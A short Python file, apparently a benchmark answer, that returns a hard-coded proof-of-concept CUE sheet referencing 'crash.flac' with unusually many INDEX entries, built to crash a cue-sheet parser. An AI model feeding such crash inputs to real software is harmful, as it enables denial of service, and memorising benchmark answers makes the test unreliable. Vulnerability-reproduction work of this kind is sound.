class Solution:
    def solve(self, src_path: str) -> bytes:
        poc = b"""FILE "crash.flac" FLAC
TRACK 01 AUDIO
  INDEX 01 00:00:00
  INDEX 02 00:00:05
  INDEX 03 00:00:10
  INDEX 04 00:00:15
  INDEX 05 00:00:20
  INDEX 06 00:00:25
  INDEX 07 00:00:30
  INDEX 08 00:00:35
TRACK 02 AUDIO
  INDEX 01 00:01:00
  INDEX 02 00:01:05
"""
        assert len(poc) == 159
        return poc
